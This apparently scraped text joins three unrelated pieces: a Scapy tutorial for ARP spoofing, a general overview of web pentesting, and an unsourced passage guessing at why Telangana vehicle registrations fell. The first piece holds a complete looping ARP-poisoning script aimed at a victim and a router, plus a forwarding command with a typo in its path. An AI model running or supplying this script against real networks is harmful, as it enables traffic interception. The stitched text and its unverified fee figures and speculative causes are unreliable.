    "text": "How to make a ARP Spoofing attack using Scapy  in Python\nNote: Here the attacks are performed under a virtual environment (virtual box) with Linux operating system as the hacker machine, Windows 10 as the victim machine and our home router as a router. This attack only works when all the devices are in the same network. Here, we are using NAT network to create this attack.\nStep 1: To implement this code in Python we are going to use a package called scapy. First, we are going to create an ARP packet using the scapy package. Here, we are not creating an ARP request, but instead, we are creating an ARP response packet .so, we are going to let us know what are fields we need to set in order to make the ARP packet as a response packet in python as follows. In scapy the ARP packet is created using the syntax as shown below.\n\n#import scapy.all as scapy\n\n#scapy.ARP()\n\n# To list the fields in ARP()\n\n#print(scapy.ls(scapy.ARP()))\n\nOutput: \nStep 2: Now let’s understand the code by first getting the mac address of the device with it’s ip address with the below code. First, we are using the above-mentioned scapy module to generate an ARP packet to the given IP address.\n\n# creating an ARP request to the ip address\n#arp_request = scapy.ARP(pdst=ip)    \n\nThen creating a broadcast message with mac address to broadcast mac that is “ff:ff:ff:ff:ff:ff” as shown below.\n\n# setting the denstination mac address to broadcast mac\n#broadcast = scapy.Ether(dst=\"ff:ff:ff:ff:ff:ff\")   \n\nThen we combine the broadcast packet with the ARP request.\n\n# combining the ARP packet with the broadcast message\n#arp_request_broadcast = broadcast / arp_request\n\nThen sent to the victim ip address and to do so we use scapy.srp() as shown below.\n\n#answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]\n\nStep 3: Now let’s combine the mac address statements above-mentioned with in a function and then you them with our while loop to continuously fool the devices.\n\n#!/usr/bin/env python\n# import time\n# import sys\n# import scapy.all as scapy\n# # mac address function which will return\n# # the mac_address of the provided ip address\n\n\n# def get_mac(ip):\n#     # creating an ARP request to the ip address\n#     arp_request = scapy.ARP(pdst=ip)\n#     # setting the denstination mac address to broadcast mac\n#     broadcast = scapy.Ether(dst=\"ff:ff:ff:ff:ff:ff\")\n#     # combining the ARP packet with the broadcast message\n#     arp_request_broadcast = broadcast / arp_request\n    \n#     # return a list of mac addresses with respective\n#     # mac addresses and ip addresses.\n#     answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]\n#     # we choose the first mac address and select\n#     # the mac address using the field hwsrc\n#     return answ[0][1].hwsrc\n\n\n# def arp_spoof(target_ip, spoof_ip):\n#     \"\"\"\" Here the ARP packet is set to response and\n#     pdst is set to the target ip \n#     either it is for victim or router and the hwdst\n#     is the mac address of the ip provided\n#     and the psrc is the spoofing ip address\n#     to manipulate the packet\"\"\"\n    \n#     packet = scapy.ARP(op=2, pdst=target_ip,\n#                       hwdst=get_mac(target_ip), psrc=spoof_ip)\n#     scapy.send(packet, verbose=False)\n\n\n# victim_ip = input()  # taking the victim ip_address\n# router_ip = input()  # taking the router ip address\n# sent_packets_count = 0  # initializing the packet counter\n# while True:\n#     sent_packets_count += 2\n#     arp_spoof(victim_ip, router_ip)\n#     arp_spoof(router_ip, victim_ip)\n#     print(\"[+] Packets sent \" + str(sent_packets_count), end=\"\\r\")\n#     sys.stdout.flush()\n#     time.sleep(2)\n\n\n\n\nOutput\n\n\nAfter implementing the program the victim does not get the internet connection because the packets are forwarded to hacker’s machine and in order to allow the flow of packets we need to run a command in a Linux shell as below.\necho 1 &gt; /procs/sys/net/ipv4/ip_forward\nThe victim ARP table is shown below:"

    "text": "In this article, we are going to discuss web application pentesting and what are the steps involved in it, and so on.\n\nWhat is Web Pentesting?\nWeb pentesting is a process of testing the security of a web application and identifying any vulnerabilities present in the application or not. This testing is done by an attacker perspective to detect the vulnerabilities more easily.\nSteps Involved in Web Pentesting\nStep 1: Recon\nRecon mainly focuses on the gathering information from the web application like technologies used , databases , versions of the technologies and many more.\nStep 2: Vulnerability Scanning\nScanning for vulnerabilities is a huge task but to reduce our time there are many tools that can automate the tasks of identifying the vulnerabilities.\nStep 3: Manual Testing\nAlthough many automation tools detect vulnerabilities but some need human interaction and manual testing.\nStep 4: Exploiting\nThis step needs to be done if you have authorized permission to do and in this step the identified vulnerabilities needs to be malicious actions to determine the effect of the vulnerability detected.\nStep 5: Reporting\nReporting the vulnerability detected helps the organization fix it and reduce their exposure to risk and external threats. The report must include detailed description of the vulnerability , steps to reproduce it and mitigations for it.\nKey Points While Conducting Web Application Pentesting\n\nGetting authorization : First getting an authorized access and permission to pentest the application is needed because to allow you to perform your attacks easily and report them.\nScope : Determine the scope of the application helps you to focus on those targets like URLs, limitations and exceptions, etc.\nUse legitimate tools: Usage of legitimate tools makes the testing worth it and doesnot allow any third party to get your data while testing. some of the example are OWASP Zap, Burpsuite, Nmap ,etc.\nDocumentation: Documentation and report preparation is the most important part of the pentesting as it helps the organization to check and reiterate it to identify the problem to mitigate it.\nKeep yourself updates: As the technology evolves new vunerabilities and zero-day attacks increases . so, to keep up with it stay updated.\n\nTools For Web Pentesting\nBurpsuite - It is a proxy tool to get the traffic flow thorugh the tool to see the request made by the browser and response given by the server. Wappalyzer- It is a extension to detect the technologies present in the web applications. Web developer - It is a browser extension to detect the links as well as many other end points in the website. shodan - It is a search engine to gather the information from the internet connected devices. censys - It works similar to shodan.\nWhy Web Application P en Tests Are Performed?\nThe web application pentesting is performed to ensure the integrity ,confidentiality and availability of the resources that the customers or company employees need to complete their tasks. It is most important to protect the end users from malicious attacks which leads to loos of customer data or the organization data which is why it is very crucial to pentest the websites and detect the vulnerabilities.\nImportance of Penetration Testing\nThe undetected bugs can be detected when conducting the pentesting. To detect the unwanted methods used in the requests from the browser. To detect the impact of the bugs detected when pentesting. Detect how far can a attacker can get in the application. To identify the weakness of the application.\nWhat are the Different Types of Penetration Testing?\nThere are mainly 3 types of testing:\n1.White box Tesing\nIt is a type of testing where we have all the access to the source code as well as the developer support to understand indetail of the functionality. This testing is mainly done at the development stage and after completion stage of the application.\n2.Blackbox Testing\nIt is a type of testing where the application details are given but the indetail functionality or the credentials are not given and you should perform the testing as an attacker perspective not as a tester (now you have to become a hacker in this testing) . Here most of the bugs are detected.\n3.Grey box Testing\nIt is a type of testing where the application as well as some walkthrough of the application functionality is provided and rest of the testing needs to be done .\nFAQ’s On Web Pentesting\nQ.1: How to start a web pentesting?\nAnswer:\nFirst to start a web pentesting we need to be aware of the how the websites works and must have basic understanding of how requests , responses are generated along with some basic knowledge of web technologies.\nQ.2: What to do after finding the bugs?\nAnswer:\nIf you are a begineer then there are many platforms that offer domains to test and they will reward you if you found any intresting bugs in their domains and these are called as “Bug bounty programs”\nQ.3: What are the operating systems used by pentesters?\nAnswer:\nMostly when it comes to web application pentesting the most used operating system is kali linux, ubuntu,etc. But those who cannot have kali linux as their default os they can use WSL(windows subsystem for linux) in windows."

The lockdown imposed by the government in March 2020 restricted the movement of people and vehicles, which led to a decline in the demand for new vehicles. Additionally, the economic slowdown caused by the pandemic also led to people postponing their plans to buy new vehicles.\nAccording to the Telangana Transport Department, the number of vehicle registrations in the state fell by 56% in April 2020 compared to the same month in the previous year. The decline was even more pronounced in the following months, with registrations falling by 72% in May 2020 and 80% in June 2020.\nHere are some other factors that may have contributed to the decline in vehicle registrations in Telangana in 2020:\nThe increase in the prices of vehicles due to the rise in the cost of raw materials. The shortage of semiconductors, which is a key component in many vehicles. The uncertainty about the future of the economy, which made people hesitant to make major purchases such as a new vehicle.\nThere are a few possible reasons why vehicle registrations in Telangana drastically reduced in May 2021.\nThe COVID-19 pandemic was at its peak in India during this time, and many people were staying home to avoid getting sick. This would have led to a decrease in the demand for new vehicles. The Telangana government increased the registration fees for vehicles in April 2021. This would have made it more expensive to buy a new vehicle, which could have also contributed to the decline in registrations. The Indian economy was also struggling during this time, which could have made it difficult for people to afford to buy a new vehicle. It is also possible that there is another factor that caused the decline in vehicle registrations in Telangana in May 2021. However, the reasons mentioned above are the most likely explanations.\nHere are some additional details about each of the reasons mentioned above:\nThe COVID-19 pandemic caused a nationwide lockdown in India in March 2020. The lockdown was gradually lifted in the following months, but many people were still hesitant to go out and about in public. This would have led to a decrease in the demand for transportation, including new vehicles. The Telangana government increased the registration fees for vehicles in April 2021. The increase was as follows: Three-wheelers: from Rs. 600 to Rs. 2,500 Light motor vehicles: from Rs. 600 to Rs. 5,000 Medium goods vehicles: from Rs. 1,000 to Rs. 1,500 Heavy goods vehicles: from Rs. 1,500 to Rs. 2,000 This increase in registration fees would have made it more expensive to buy a new vehicle, which could have contributed to the decline in registrations.\nThe Indian economy was also struggling during this time due to the COVID-19 pandemic. The unemployment rate rose, and many businesses were forced to close. This would have made it difficult for people to afford to buy a new vehicle.\nHow does the distribution of vehicles vary by vehicle class (MotorCycle, MotorCar, AutoRickshaw, Agriculture) across different districts?
